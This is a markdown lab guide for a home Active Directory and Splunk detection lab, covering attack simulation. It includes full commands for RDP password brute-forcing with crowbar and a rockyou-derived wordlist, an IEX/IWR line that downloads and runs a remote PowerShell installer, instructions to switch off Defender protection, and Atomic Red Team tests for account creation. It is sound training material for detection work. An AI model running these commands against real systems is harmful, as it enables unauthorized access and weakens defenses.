[Back to README](../README.md)

# 05. Attack Simulation

> [!CAUTION]
> Run these only against the VMs you built in this lab, on the isolated `AD-Project` NAT network. Never point
> these tools at systems you do not own. Take snapshots first so you can reset.

Goal: generate known-bad activity so you can prove (or disprove) that your Splunk telemetry sees it.

## Part A: RDP password guessing (MITRE T1110.001)

Attacker: Kali. Victim: Target-PC (`192.168.10.100`).

### Step 1: Give Kali its static IP

Check the connection name first, then set the address (Kali uses NetworkManager):

```bash
nmcli con show
sudo nmcli con mod "Wired connection 1" ipv4.method manual \
  ipv4.addresses 192.168.10.250/24 ipv4.gateway 192.168.10.1 ipv4.dns 8.8.8.8
sudo nmcli con up "Wired connection 1"
ip a
```

### Step 2: Install the tool

```bash
sudo apt-get update && sudo apt install -y crowbar
```

### Step 3: Build a small wordlist

The full `rockyou.txt` has about 14 million entries, far too many for a lab. A short list is enough to produce a clear
burst of failures followed by one success.

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
head -n 10 /usr/share/wordlists/rockyou.txt > ~/passwords.txt
echo "THE_REAL_LAB_PASSWORD_FOR_TSMITH" >> ~/passwords.txt
cat ~/passwords.txt
```

You should see ten wrong passwords and then the correct one last. Use your own throwaway password in the last line and
never save it anywhere that gets committed.

### Step 4: Run the attack

```bash
crowbar -b rdp -u tsmith -C ~/passwords.txt -s 192.168.10.100/32
```

A successful run ends with `RDP-SUCCESS`. Note the time you started; you will search for that window in Splunk.

## Part B: Atomic Red Team (MITRE T1136.001 and T1059.001)

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) is a library of small, documented tests, each
mapped to a MITRE ATT&CK technique. You run them on **Target-PC** and then check whether your telemetry caught them.

### Step 1: Prepare Defender

Defender will quarantine many atomic payloads. On this lab VM only, either exclude `C:\AtomicRedTeam`
(**Windows Security > Virus & threat protection > Manage settings > Exclusions**) or turn real-time protection off.
Revert the exclusion after testing.

### Step 2: Install

In an **Administrator PowerShell**. Read the script before running it; it downloads and executes code.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

> [!IMPORTANT]
> The first `IEX` line only *loads* the installer function. The `Install-AtomicRedTeam -getAtomics` line is what
> actually installs the module and downloads the test definitions. Skipping it leaves `Invoke-AtomicTest` without any
> tests to run.

### Step 3: Look before you run

A technique often contains many tests, some noisier or more destructive than others. List them first:

```powershell
Invoke-AtomicTest T1136.001 -ShowDetailsBrief
Invoke-AtomicTest T1059.001 -ShowDetailsBrief
```

### Step 4: Run chosen tests

Pick specific test numbers from the list instead of running everything:

```powershell
Invoke-AtomicTest T1136.001 -TestNumbers 1     # create a local account via the command line
Invoke-AtomicTest T1059.001 -TestNumbers 1     # choose a PowerShell test from the list above
```

(Test numbers vary between releases; confirm them with `-ShowDetailsBrief`.)

### Step 5: Clean up

```powershell
Invoke-AtomicTest T1136.001 -TestNumbers 1 -Cleanup
```

Then detect what you just did: [06. Detection engineering](06-detection-engineering.md).
